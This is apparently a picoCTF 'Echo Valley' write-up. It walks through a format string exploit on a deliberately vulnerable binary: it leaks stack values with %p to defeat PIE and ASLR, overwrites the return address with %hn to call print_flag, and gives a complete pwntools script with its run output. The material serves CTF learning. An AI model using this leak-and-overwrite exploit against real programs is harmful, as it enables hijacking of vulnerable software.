# Echo Valley #
 
## Overview ##

300 points

Category: [Binary Exploitation](../)

Tags: `#binaryexploitation #formatstring #infoleak #writewhatwhere #PIE #ASLR`

## Description ##

The echo valley is a simple function that echoes back whatever you say to it.
But how do you make it respond with something more interesting, like a flag?
Download the source: `valley.c`
Download the binary: `valley`

## Approach ##

Analysing the provided challenge source file `valley.c`, we can see at `Line #39` a format string vulnerability, which is essentially displaying (or echoing) back our input to `buf`:

    printf(buf);

There is a `print_flag()` function that is not called from the source file anywhere, thus is our task to make this call happen.

Note also that this vulnerability resides within a loop that we can exploit as many times as we like, only exiting when we enter `"exit"` as the input to echo.

Checking the binary security:

    $ checksec valley
    [*] '/home/user/picoCTF/Echo-Valley/valley'
        Arch:     amd64-64-little
        RELRO:    Full RELRO
        Stack:    Canary found
        NX:       NX enabled
        PIE:      PIE enabled

Similar to [PIE TIME 2](../PIE%20TIME%202/PIE%20TIME%202.md) challenge our plan of attack is to leak the return address of `main()` using a typical infoleak format string attack to display contents of the stack (running locally in `gdb` such that Address Space Layout Randomisation (ASLR) is disabled), to locate this return address on the stack. Then calculate the relative offset from this return address to the `print_flag()` function. From here we can formulate what a new return address to return to `print_flag()` should be when running with ASLR (using the leaked return address, and relative offset).

To modify the return address on the stack, there is no buffer overflow to exploit in the input of `buf`, however we can use the typical "write-what-where" variant of the format string attack to write the new return address. Which I go into a lot of detail within my format-string series challenge write-ups from picoCTF-2024 (refer [format-string-2](https://github.com/snwau/picoCTF-2024-Writeup/blob/main/Binary%20Exploitation/format%20string%202/format%20string%202.md) and [format-string-3](https://github.com/snwau/picoCTF-2024-Writeup/blob/main/Binary%20Exploitation/format%20string%203/format%20string%203.md)).

Finding the offsets of the return to `main()` from the `echo_valley()` function and `print_flag()` functions:

    $ readelf -s ./valley | egrep "main|print_flag"
        40: 0000000000001401    25 FUNC    GLOBAL DEFAULT   16 main
        43: 0000000000001269   158 FUNC    GLOBAL DEFAULT   16 print_flag

    $ objdump -M intel -d valley > objdump_valley.txt

From the `objdump` output:

      0000000000001401 <main>:
          1401: f3 0f 1e fa           endbr64 
          1405: 55                    push   rbp
          1406: 48 89 e5              mov    rbp,rsp
          1409: b8 00 00 00 00        mov    eax,0x0
          140e: e8 f4 fe ff ff        call   1307 <echo_valley>
    ->    1413: b8 00 00 00 00        mov    eax,0x0
          1418: 5d                    pop    rbp
          1419: c3 

So, we can calculate a relative offset of `print_flag()` (`0x1269`) from the return address offset (`0x1413`) :

    0x1413 - 0x1269 = 0x1AA

Running `valley` in `gdb` to discover and construct our infoleak format string:

    $ gdb ./valley

    > br main
    > r

When execution breaks, we can take note of the return address from `echo_valley()` at `<main+18>`, which is `0x555555555413`.

    ─────────────────────────────────────────────────────────────── code:x86:64 ────
       0x555555555401 <main+0>         endbr64 
       0x555555555405 <main+4>         push   rbp
       0x555555555406 <main+5>         mov    rbp, rsp
    -> 0x555555555409 <main+8>         mov    eax, 0x0
       0x55555555540e <main+13>        call   0x555555555307 <echo_valley>
       0x555555555413 <main+18>        mov    eax, 0x0
       0x555555555418 <main+23>        pop    rbp
       0x555555555419 <main+24>        ret    
       0x55555555541a                  add    BYTE PTR [rax], al

Continuing execution within `gdb` and prompted for input to "shout", I used the typical format string infoleak attack to display contents of the stack. The format string I constructed for convenience via the python CLI, that I copy-pasted.

    $ python3 -c "print('%p.'*30)"
    %p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.

Back to `gdb`:

    > c
    Continuing.
    Welcome to the Echo Valley, Try Shouting: 
    %p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.
    You heard in the distance: 0x5555555560c1.(nil).0x7ffff7e16a00.(nil).0x5555555596b0.0x70252e70252e7025.0x252e70252e70252e.0x2e70252e70252e70.0x70252e70252e7025.0x252e70252e70252e.0x2e70252e70252e70.0x70252e70252e7025.0x252e70252e70252e.0x2e70252e70252e70.0x70252e70252e7025.0x252e70252e70252e.0xa2e70.0x7fffffffe3f9.0x104bb88301417e00.0x7fffffffdfc0.0x555555555413.0x1.0x7ffff7c29d90.(nil).0x555555555401.0x1ffffe0c0.0x7fffffffe0d8.(nil).0xb41410ea8dc31158.0x7fffffffe0d8.

Our return address noted earlier (`0x555555555413`) can be seen as the 21'st pointer displayed in the output.

To confirm we can enter another round of input to shout into the abyss, that will print just this one parameter we are interested in:

    %21$p
    You heard in the distance: 0x555555555413

So at this point I transitioned to writing a [pwntools](https://docs.pwntools.com/en/stable/) script to undertake this attack, extract the return address (under the influence of ASLR), adjust via the aforementioned relative offset to `print_flag()` to calculate our target return address.

To modify the return address on the stack with our calculated target, we must know the whereabouts of this value in memory, such that we can target our write to modify it.

A quick inspection of the stack layout at entry of `echo_valley()`:

     0x007fffffffdf40 |                             |
                      |-----------------------------|
                      |  local variables: buf[100]  |
                      |                             |
                      |                             |
                      |     (+ some alignment)      |
                      |-----------------------------|
     0x007fffffffdfb0 |   Saved $rbp (main())       |----+
                      |-----------------------------|    |
     0x007fffffffdfb8 | Return address (<main+18>)  |    |
                      |-----------------------------|    |
     0x007fffffffdfc0 |                             |<---+

From this we can see that the saved `$rbp` from `main()`'s stack frame when `echo_valley()` is points to an address directly below return address, meaning we can leak the value of this saved `$rbp`, add 8-bytes and have the absolute address of the return address value, despite the stack moving around with ASLR.

Therefore the saved `$rbp` value is leaked as the 20'th parameter in the infoleak format string attack `%20$p`. So this can be obtained similar to the calculation of the return address in our [pwntools](https://docs.pwntools.com/en/stable/) script.

The only remaining task now is to construct our "write-what-where" variant of the format string attack to update the return address to our target, using the form `%<value>x%<param-num>$hn<alignment-padding><address>`.

Explained in sections;

- `%<value>x` : we request `printf()` output a hex formatted integer, but padded to a total output length of `<value>` characters. The actual value must be calculated dynamically to be the bottom 16-bits of our target return address.
- `<param-num>$hn` : using the `printf()` mechanism to have it write the current output length thus far to a supplied `printf()` parameter, this particular format writes only 16-bits (short word). We experiment with known string tokens to determine where our `<address>` value resides on the stack in terms of `printf()` arguments, this ended up correlating with the 8'th parameter. Note that this is a function of our constructed format string, so modifying this adjusts the location of this parameter.
- `<alignment-padding>` : I typically like to add `.` padding characters to these format string attacks to align parameters such as target address to write to nice word boundaries. For this challenge I padded the constructed format string to 16-characters.
- `<address>` : The value of the address we want `printf()` to write it's output length to (see above), which will correlate with the address holding the return to main address.

To bring some of this together and demonstrate how the 8'th parameter value was selected, using the structure of the format string described above, and stated padding, I could replicate this with known token values. Where `A` represented the first three sections of the format string and `B` the 8-bytes of the target write address. Adding a heap of `%p.` to leak stack contents again, we should be able to locate where our target address ends up:

    $ ./valley 
    Welcome to the Echo Valley, Try Shouting: 
    AAAAAAAAAAAAAAAABBBBBBBB%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.
    You heard in the distance: AAAAAAAAAAAAAAAABBBBBBBB0x569199d970c1.(nil).0x7f8e4cc16a00.(nil).0x56919eafd6b0.0x4141414141414141.0x4141414141414141.0x4242424242424242.0x70252e70252e7025.0x252e70252e70252e.0x2e70252e70252e70.0x70252e70252e7025.0xa2e70252e70252e.

`BBBBBBBB` or (0x4242424242424242) can be seen in the 8'th parameter.

## Solution ##

The approach detailed above was implemented via a [pwntools](https://docs.pwntools.com/en/stable/) script to obtain the final solution.

    #!/usr/bin/env python3

    from pwn import *

    target_elf = ELF("./valley")

    # command line support for local, remote and gdb modes
    if len(sys.argv) > 1:
      if "remote" in sys.argv:
        if len(sys.argv) > 3:
          target_proc = remote(sys.argv[2], sys.argv[3])
        else:
          print('usage: ./pwn-game.py remote <server> <port>')
          exit(1)
      elif "gdb" in sys.argv:
        target_proc = target_elf.process()
        gdb.attach(target_proc)
    else:
      target_proc = target_elf.process()

    # format-string infoleak to dump the return address to main()
    target_proc.recvuntil(b'Try Shouting:')
    target_proc.sendline(b'%21$p')
    target_proc.recvline() # newline
    ret_to_main_leak_line = target_proc.recvline();
    ret_to_main_hex_str = re.search("0x[0-9a-f]+", ret_to_main_leak_line.decode("utf-8"))
    ret_to_main_address = int(ret_to_main_hex_str.group(), 16)
    print('Return to main() address: ' + str(hex(ret_to_main_address)))

    # format-string based infoleak to dump the saved $rbp (main()'s stack frame)
    target_proc.sendline(b'%20$p')
    rbp_of_main_leak = target_proc.recvline();
    rbp_of_main_hex_str = re.search("0x[0-9a-f]+", rbp_of_main_leak.decode("utf-8"))
    rbp_of_main_address = int(rbp_of_main_hex_str.group(), 16)
    print('Saved $rbp (stack frame): ' + str(hex(rbp_of_main_address)))

    # calculate absolute address of the return value on the stack
    ret_to_main_stack_addr = rbp_of_main_address - 0x08
    print('return value memory address: ' + str(hex(ret_to_main_stack_addr)))

    # construct a write via format string vulnerability, to write the
    # two LSBs (short word) with those of the target return address
    # (calculated using the leaked <main+18> address and the calculated 
    # relative offset to print_flag().
    payload = b'%' + str((ret_to_main_address - 0x1AA) & 0xFFFF).encode() + b'x%8$hn'
    payload += b'.'*(16 - len(payload))
    payload += p64(ret_to_main_stack_addr)
    target_proc.sendline(payload)
    target_proc.sendline(b'exit')
    target_proc.interactive()

Running the script generates a lot of output to construct the correct write values, but once successful the script goes interactive and we can see the contents of the `flag.txt` after successfully executing the `print_flag()` function.

    $ ./pwn-valley.py remote shape-facility.picoctf.net 63273
    [*] '/home/user/picoCTF/Echo-Valley/valley'
        Arch:     amd64-64-little
        RELRO:    Full RELRO
        Stack:    Canary found
        NX:       NX enabled
        PIE:      PIE enabled
    [+] Opening connection to shape-facility.picoctf.net on port 63273: Done
    Return to main() address: 0x56715a254413
    Saved $rbp (stack frame): 0x7ffc0ca1ee70
    return value memory address: 0x7ffc0ca1ee68
    [*] Switching to interactive mode
    You heard in the distance:                                                                                               
    ... (snip - lots of output) ...


          468f65c0....h\xee\xa1
     \xfc$                                                                     The Valley Disappears
    Congrats! Here is your flag: picoCTF{...........redacted.............}

Where the actual flag value has been redacted for the purposes of this write up.
